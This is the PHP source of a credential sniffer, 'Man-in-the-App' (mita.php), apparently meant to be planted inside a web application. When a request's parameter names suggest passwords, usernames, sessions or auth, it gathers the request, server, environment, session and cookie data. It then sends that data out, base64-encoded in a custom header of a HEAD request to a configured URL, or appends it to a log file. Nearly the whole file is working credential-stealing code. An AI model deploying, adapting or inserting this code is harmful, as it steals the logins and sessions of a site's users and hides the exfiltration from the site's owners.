<?php

/*
    Man-in-the-App HTTP REQUEST Credential Sniffer

    mita.php - Main Program

    Copyright (C) 2012 - 2014 Jan Seidl

    The MIT License (MIT)

    Permission is hereby granted, free of charge, to any person obtaining a copy of
    this software and associated documentation files (the "Software"), to deal in
    the Software without restriction, including without limitation the rights to
    use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
    the Software, and to permit persons to whom the Software is furnished to do so,
    subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
    FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
    COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
    IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
    CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

 */

/* Constants */

define('MITA_EXF_FILE', 0);
define('MITA_EXF_HTTP_HEAD', 1);

if (stristr(PHP_OS, 'WIN')) {
    define('DS', '\\');
} else {
    define('DS', '/');
}//end :: if

/* Configuration */

# define('MITA_EXF_FILE_FILENAME', 'hcs.log');
define('MITA_EXF_HTTP_HEAD_URL', 'http://localhost/header_dumper.php');
define('MITA_EXF_HTTP_HEAD_HEADER', 'X-MITA-Payload');
define('MITA_EXFILTRATION_MODE', MITA_EXF_HTTP_HEAD);

/* Functions */

function mita_init() {

    # Keywords that will trigger the capture (regex)
    $trigger_keywords = '(p(?:(?:ass)?(?:word|wd|w)|ass)|user(?:name|)|sess(?:ion|)|login|auth(?:entication|orization|)|private)';

    $request_keys = array_keys($_REQUEST);
    $request_keys_str = implode(" ", $request_keys);

    $matches = Array();
    $match_status = 0;

    $match_status = preg_match('/'.$trigger_keywords.'/i', $request_keys_str, $matches);

    if ($match_status === 1) mita_exfiltrate_session();

}//end :: mita_init

function mita_exfiltrate_session() {

    $session_data = Array(
        'GET'       => (array) $_GET,
        'SERVER'    => (array) $_SERVER
        );

    if (isset($_ENV)) $session_data['ENV'] = $_ENV;
    if (isset($_SESSION)) $session_data['SESSION'] = $_SESSION;
    if (isset($_POST)) $session_data['POST'] = $_POST;
    if (isset($_COOKIE)) $session_data['COOKIE'] = $_COOKIES;

    switch (MITA_EXFILTRATION_MODE) {
        case MITA_EXF_HTTP_HEAD:
            mita_exf_http_head($session_data);
            break;
        case MITA_EXF_FILE:
        default:
            mita_exf_file($session_data);
            break;
    }//end :: switch

}//end :: mita_exfiltrate_session

function mita_exf_file($session_data) {
    if (!defined('MITA_EXF_FILE_FILENAME')) return false;

    $filepath = realpath(dirname(__FILE__));

    $line = "#### MITA LOG START ## ".date("d/m/Y H:i:s")." ####\n";
    $line .= print_r($session_data, true);
    $line .= "### MITA LOG END ###\n";

    return file_put_contents($filepath.DS.MITA_EXF_FILE_FILENAME, $line, FILE_APPEND | LOCK_EX);
    
}//end :: mita_exf_file

function mita_exf_http_head($session_data) {

    if (!defined('MITA_EXF_HTTP_HEAD_URL')) return false;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, MITA_EXF_HTTP_HEAD_URL);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, 1); 
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1); 
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

    // Only calling the head
    curl_setopt($ch, CURLOPT_HEADER, true); // header will be at output
    curl_setopt($ch, CURLOPT_NOBODY, true); // HTTP request is 'HEAD'

    // Set our payload
    $encoded_data = base64_encode(serialize($session_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, Array(MITA_EXF_HTTP_HEAD_HEADER.": $encoded_data")); 

    curl_exec ($ch); // dont mind return
    curl_close ($ch);

    return true;

}//end :: if

mita_init();

?>
